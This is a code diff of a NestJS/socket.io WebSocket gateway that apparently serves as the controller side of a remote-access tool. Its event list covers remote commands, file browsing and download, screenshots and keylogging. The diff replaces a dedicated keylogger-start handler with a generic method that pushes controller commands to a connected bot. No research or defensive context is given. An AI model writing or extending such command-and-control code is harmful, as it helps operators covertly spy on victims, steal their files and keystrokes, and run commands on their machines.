@@ -3,13 +3,23 @@ import {
   OnGatewayDisconnect,
   SubscribeMessage,
   WebSocketGateway,
+  WebSocketServer,
 } from "@nestjs/websockets";
-import { Socket } from "socket.io";
-import { WsBotRepository } from "../domain/ws-bot.repository";
+import { Server, Socket } from "socket.io";
 import { WsBotJoinsUseCase } from "../application/ws-bot-joins.use-case";
 import { WsBotLeavesUseCase } from "../application/ws-bot-leaves.use-case";
-import { WsBotKeyLoggerUseCase } from "../application/events/ws-bot-keylogger.use-case";
-import type { WsBotKeyLoggerStart } from "../application/events/ws-bot-events.types";
+
+type BotEvents =
+  | "connectedClient"
+  | "disconnectedClient"
+  | "sendScreensToBot"
+  | "sendScreenshotToBot"
+  | "message"
+  | "getCmdCommand"
+  | "getFilesFolder"
+  | "downloadFile"
+  | "addFriend"
+  | "sendKeyLogger";
 
 @WebSocketGateway({
   namespace: "bot",
@@ -20,14 +30,33 @@ export class WsBotGateway implements OnGatewayConnection, OnGatewayDisconnect {
   constructor(
     private readonly wsBotJoinsUseCase: WsBotJoinsUseCase,
     private readonly wsBotLeavesUseCase: WsBotLeavesUseCase,
-    private readonly wsBotKeyLoggerUseCase: WsBotKeyLoggerUseCase,
   ) {}
+
+  @WebSocketServer()
+  server!: Server;
+
+  private botid: string = "";
 
   afterInit(client: Socket) {}
 
+  async sendEventToBot(controllerid: string, event: BotEvents, payload?: any) {
+    // const client = this.server.sockets.sockets.get(clientid);
+    // console.log("client", client);
+    // if (client) {
+    //   client.emit(event, payload);
+    // }
+
+    console.log("message to bot", controllerid, event);
+    this.server.to(this.botid).emit(event, {
+      ...payload,
+      controllerid,
+    });
+  }
+
   async handleConnection(client: Socket) {
     try {
-      return this.wsBotJoinsUseCase.execute(client);
+      await this.wsBotJoinsUseCase.execute(client);
+      this.botid = client.id;
       // await this.clientJoinsUseCase.execute()
     } catch (error) {
       // console.error("Connection error:", error);
@@ -37,11 +66,5 @@ export class WsBotGateway implements OnGatewayConnection, OnGatewayDisconnect {
 
   handleDisconnect(client: Socket) {
     this.wsBotLeavesUseCase.execute();
-  }
-
-  @SubscribeMessage("keylogger:start")
-  async startKeyLogger(data: WsBotKeyLoggerStart) {
-    this.wsBotKeyLoggerUseCase.startListening(data.controllerid);
-    console.log("Keylogger start", data);
   }
 }
